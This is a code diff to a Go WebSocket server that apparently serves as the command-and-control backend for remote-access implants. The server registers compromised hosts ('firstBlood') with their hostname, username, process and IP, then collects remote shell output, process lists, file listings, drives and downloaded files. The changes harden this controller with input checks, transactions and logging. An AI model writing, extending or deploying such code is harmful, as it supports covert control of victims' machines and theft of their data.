@@ -56,6 +56,25 @@ var (
 	}
 )
 
+// 安全分割OS信息函数
+func safeSplitOSInfo(osInfo string) (hostName, userName, processName string) {
+	if osInfo == "" {
+		return "Unknown", "Unknown", "Unknown"
+	}
+
+	parts := strings.SplitN(osInfo, "\t", 3)
+	switch len(parts) {
+	case 3:
+		return parts[0], parts[1], parts[2]
+	case 2:
+		return parts[0], parts[1], "Unknown"
+	case 1:
+		return parts[0], "Unknown", "Unknown"
+	default:
+		return "Unknown", "Unknown", "Unknown"
+	}
+}
+
 // Add 添加客户端到管理器
 func (cm *ClientManager) Add(uid string, client *WSClient) {
 	cm.Mu.Lock()
@@ -221,6 +240,12 @@ func (c *WSClient) startHeartbeatCheck() {
 func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 	logger.Info("New WebSocket connection attempt from:", r.RemoteAddr)
 
+	defer func() {
+		if r := recover(); r != nil {
+			logger.Error("WebSocket handler panic recovered:", r)
+		}
+	}()
+
 	// 升级HTTP连接为WebSocket
 	ws, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
@@ -266,30 +291,32 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 		messageType, message, err := ws.ReadMessage()
 		if err != nil {
 			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
-				logger.Info("WebSocket closed unexpectedly:", err)
+				logger.Info("WebSocket closed unexpectedly:", err, "from:", r.RemoteAddr)
 			} else if websocket.IsCloseError(err) {
-				logger.Info("WebSocket closed normally")
+				logger.Info("WebSocket closed normally from:", r.RemoteAddr)
+			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+				logger.Info("WebSocket read timeout from:", r.RemoteAddr)
 			} else {
-				logger.Error("WebSocket read error:", err)
+				logger.Error("WebSocket read error:", err, "from:", r.RemoteAddr)
 			}
 			break
 		}
 
 		// 只处理二进制消息
 		if messageType != websocket.BinaryMessage {
-			logger.Warn("Received non-binary message, ignoring")
+			logger.Warn("Received non-binary message, ignoring from:", r.RemoteAddr)
 			continue
 		}
 
 		if len(message) == 0 {
-			logger.Warn("Received empty message, ignoring")
+			logger.Warn("Received empty message, ignoring from:", r.RemoteAddr)
 			continue
 		}
 
-		// 处理消息
+		// 处理消息 - 添加基本长度检查
 		if len(message) < 4 {
-			logger.Error("Message too short")
-			continue
+			logger.Error("Message too short from:", r.RemoteAddr)
+			break
 		}
 
 		msgTypeBytes := message[:4]
@@ -297,17 +324,33 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 
 		switch msgType {
 		case 1: // firstBlood
+			if len(message) < 5 { // 至少需要类型+1字节数据
+				logger.Error("FirstBlood message too short from:", r.RemoteAddr)
+				break
+			}
+
 			msg := message[4:]
+			if len(msg) == 0 {
+				logger.Error("Empty FirstBlood payload from:", r.RemoteAddr)
+				break
+			}
+
 			tmpMetainfo, err := encrypt.DecodeBase64(msg)
 			if err != nil {
-				logger.Error("DecodeBase64 failed:", err)
-				continue
+				logger.Error("DecodeBase64 failed:", err, "from:", r.RemoteAddr)
+				break
 			}
 
 			metainfo, err := encrypt.Decrypt(tmpMetainfo)
 			if err != nil {
-				logger.Error("Decrypt failed:", err)
-				continue
+				logger.Error("Decrypt failed:", err, "from:", r.RemoteAddr)
+				break
+			}
+
+			// 验证metainfo长度
+			if len(metainfo) < 9 {
+				logger.Error("Metainfo too short:", len(metainfo), "from:", r.RemoteAddr)
+				break
 			}
 
 			uid := encrypt.BytesToMD5(metainfo)
@@ -332,16 +375,25 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 			exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)
 
 			if !exists { // FirstBlood
+				// 安全解析数据
+				if len(metainfo) < 9 {
+					logger.Error("Metainfo too short for parsing from:", r.RemoteAddr)
+					break
+				}
+
 				processID := binary.BigEndian.Uint32(metainfo[:4])
-				flag := int(metainfo[4:5][0])
+				flag := int(metainfo[4])
 				ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
 				localIP := utils.Uint32ToIP(ipInt).String()
-				osInfo := string(metainfo[9:])
 
-				osArray := strings.Split(osInfo, "\t")
-				hostName := osArray[0]
-				UserName := osArray[1]
-				processName := osArray[2]
+				// 安全获取osInfo
+				var osInfo string
+				if len(metainfo) > 9 {
+					osInfo = string(metainfo[9:])
+				}
+
+				// 使用安全分割函数
+				hostName, UserName, processName := safeSplitOSInfo(osInfo)
 
 				// 获取外网IP
 				externalIp, _, err := net.SplitHostPort(r.RemoteAddr)
@@ -351,6 +403,12 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 				if externalIp == "::1" {
 					externalIp = "127.0.0.1"
 				}
+
+				// 验证IP地址
+				if net.ParseIP(externalIp) == nil {
+					externalIp = "0.0.0.0"
+				}
+
 				address, _ := qqwry.GetLocationByIP(externalIp)
 
 				currentTime := time.Now()
@@ -385,14 +443,36 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 					Color:      "",
 				}
 
-				// 插入数据库
-				if _, err := database.Engine.Insert(&c); err != nil {
-					logger.Error("Failed to insert client:", err)
+				// 插入数据库 - 使用事务保证一致性
+				session := database.Engine.NewSession()
+				defer session.Close()
+
+				if err := session.Begin(); err != nil {
+					logger.Error("Failed to start transaction:", err)
+					break
 				}
 
-				// 插入相关表
-				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
-				database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})
+				if _, err := session.Insert(&c); err != nil {
+					session.Rollback()
+					logger.Error("Failed to insert client:", err)
+					break
+				}
+
+				if _, err := session.Insert(&database.Shell{Uid: uid, ShellContent: ""}); err != nil {
+					session.Rollback()
+					logger.Error("Failed to insert shell:", err)
+					break
+				}
+
+				if _, err := session.Insert(&database.Notes{Uid: uid, Note: ""}); err != nil {
+					session.Rollback()
+					logger.Error("Failed to insert notes:", err)
+					break
+				}
+
+				if err := session.Commit(); err != nil {
+					logger.Error("Failed to commit transaction:", err)
+				}
 
 				// 发送Webhook通知
 				if exists, key := webhooks.CheckEnable(); exists {
@@ -407,31 +487,49 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 			}
 
 		case 2: // otherMsg
+			if len(message) < 8 { // 至少需要类型+4字节长度+部分数据
+				logger.Error("OtherMsg message too short from:", r.RemoteAddr)
+				break
+			}
+
 			msg := message[4:]
 			if len(msg) < 4 {
 				logger.Error("OtherMsg too short")
-				continue
+				break
 			}
 
 			metaLen := binary.BigEndian.Uint32(msg[:4])
-			if len(msg) < int(4+metaLen) {
-				logger.Error("Invalid meta length")
-				continue
+
+			// 验证metaLen的合理性
+			if metaLen > uint32(len(msg)-4) {
+				logger.Error("Invalid meta length:", metaLen, "available:", len(msg)-4)
+				break
+			}
+
+			if metaLen == 0 {
+				logger.Error("Zero meta length")
+				break
 			}
 
 			metaMsg := msg[4 : 4+metaLen]
 			realMsg := msg[4+metaLen:]
 
+			// 验证realMsg不为空
+			if len(realMsg) == 0 {
+				logger.Error("Empty real message")
+				break
+			}
+
 			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
 			if err != nil {
 				logger.Error("DecodeBase64 failed:", err)
-				continue
+				break
 			}
 
 			metainfo, err := encrypt.Decrypt(tmpMetainfo)
 			if err != nil {
 				logger.Error("Decrypt failed:", err)
-				continue
+				break
 			}
 
 			uid := encrypt.BytesToMD5(metainfo)
@@ -439,30 +537,31 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 			// 检查客户端是否在线
 			if _, exists := globalClientManager.Get(uid); !exists {
 				logger.Warn("Received message from offline client:", uid)
-				continue
+				break
 			}
 
 			dataBytes, err := encrypt.DecodeBase64(realMsg)
 			if err != nil {
 				logger.Error("DecodeBase64 failed:", err)
-				continue
+				break
 			}
 
 			dataBytes, err = encrypt.Decrypt(dataBytes)
 			if err != nil {
 				logger.Error("First decrypt failed:", err)
-				continue
+				break
 			}
 
 			dataBytes, err = encrypt.Decrypt(dataBytes)
 			if err != nil {
 				logger.Error("Second decrypt failed:", err)
-				continue
+				break
 			}
 
+			// 严格检查dataBytes长度
 			if len(dataBytes) < 4 {
-				logger.Error("Decrypted data too short")
-				continue
+				logger.Error("Decrypted data too short:", len(dataBytes))
+				break
 			}
 
 			replyTypeBytes := dataBytes[:4]
@@ -473,36 +572,66 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 			case 0: // 命令行展示
 				var shell database.Shell
 				if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
-					shell.ShellContent += string(data) + "\n"
+					// 限制数据长度，防止过大的日志
+					var content string
+					if len(data) > 10000 {
+						content = string(data[:10000]) + "\n[Data truncated...]"
+					} else {
+						content = string(data) + "\n"
+					}
+
+					shell.ShellContent += content
 					database.Engine.Where("uid = ?", uid).Update(&shell)
 				}
 
 			case 31: // 错误展示
 				var shell database.Shell
 				if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
-					shell.ShellContent += "!Error: " + string(data) + "\n"
+					// 限制数据长度，防止过大的日志
+					var content string
+					if len(data) > 10000 {
+						content = string(data[:10000]) + "\n[Data truncated...]"
+					} else {
+						content = string(data)
+					}
+
+					shell.ShellContent += "!Error: " + content + "\n"
 					database.Engine.Where("uid = ?", uid).Update(&shell)
 				}
 
 			case command.PS:
-				command.VarPidQueue.Add(uid, string(data))
+				if len(data) > 0 {
+					command.VarPidQueue.Add(uid, string(data))
+				}
 
 			case command.FileBrowse:
-				command.VarFileBrowserQueue.Add(uid, string(data))
+				if len(data) > 0 {
+					command.VarFileBrowserQueue.Add(uid, string(data))
+				}
 
 			case 22: // 文件下载第一条信息
-				if len(data) < 4 {
+				if len(data) < 8 { // 至少4字节长度+部分路径
 					logger.Error("File download info too short")
 					break
 				}
 
 				fileLen := int(binary.BigEndian.Uint32(data[:4]))
-				if len(data) < 4+fileLen {
-					logger.Error("Invalid file path length")
+				if len(data) < 5 { // 至少4字节长度+1字节路径
+					logger.Error("No file path in download info")
 					break
 				}
 
 				filePath := string(data[4:])
+				if filePath == "" {
+					logger.Error("Empty file path")
+					break
+				}
+
+				// 验证文件长度合理性
+				if fileLen <= 0 {
+					logger.Error("Invalid file length:", fileLen)
+					break
+				}
 
 				// 使用安全路径函数
 				fullPath, err := utils.GetSafeFilePath(uid, filePath)
@@ -546,7 +675,7 @@ WHERE uid = ? AND file_path = ?;
 				fp.Close()
 
 			case command.DOWNLOAD: // 文件下载
-				if len(data) < 4 {
+				if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
 					logger.Error("Download data too short")
 					break
 				}
@@ -554,6 +683,11 @@ WHERE uid = ? AND file_path = ?;
 				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
 				if len(data) < 4+filePathLen {
 					logger.Error("Invalid file path length in download")
+					break
+				}
+
+				if filePathLen == 0 {
+					logger.Error("Zero file path length")
 					break
 				}
 
@@ -593,11 +727,13 @@ WHERE uid = ? AND file_path = ?;
 				fp.Close()
 
 			case command.DRIVES:
-				drives := utils.GetExistingDrives(data)
-				command.VarDrivesQueue.Add(uid, drives)
+				if len(data) > 0 {
+					drives := utils.GetExistingDrives(data)
+					command.VarDrivesQueue.Add(uid, drives)
+				}
 
 			case command.FileContent:
-				if len(data) < 4 {
+				if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
 					logger.Error("File content data too short")
 					break
 				}
@@ -605,6 +741,11 @@ WHERE uid = ? AND file_path = ?;
 				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
 				if len(data) < 4+filePathLen {
 					logger.Error("Invalid file path length in file content")
+					break
+				}
+
+				if filePathLen == 0 {
+					logger.Error("Zero file path length")
 					break
 				}
 
@@ -627,17 +768,27 @@ WHERE uid = ? AND file_path = ?;
 			}
 
 		case 3: // heartBeat
+			if len(message) < 5 { // 至少需要类型+1字节数据
+				logger.Error("HeartBeat message too short from:", r.RemoteAddr)
+				break
+			}
+
 			msg := message[4:]
+			if len(msg) == 0 {
+				logger.Error("Empty HeartBeat payload from:", r.RemoteAddr)
+				break
+			}
+
 			tmpMetainfo, err := encrypt.DecodeBase64(msg)
 			if err != nil {
 				logger.Error("DecodeBase64 failed:", err)
-				continue
+				break
 			}
 
 			metainfo, err := encrypt.Decrypt(tmpMetainfo)
 			if err != nil {
 				logger.Error("Decrypt failed:", err)
-				continue
+				break
 			}
 
 			uid := encrypt.BytesToMD5(metainfo)
@@ -649,7 +800,7 @@ WHERE uid = ? AND file_path = ?;
 			}
 
 		default:
-			logger.Warn("Unknown message type:", msgType)
+			logger.Warn("Unknown message type:", msgType, "from:", r.RemoteAddr)
 		}
 	}
 }
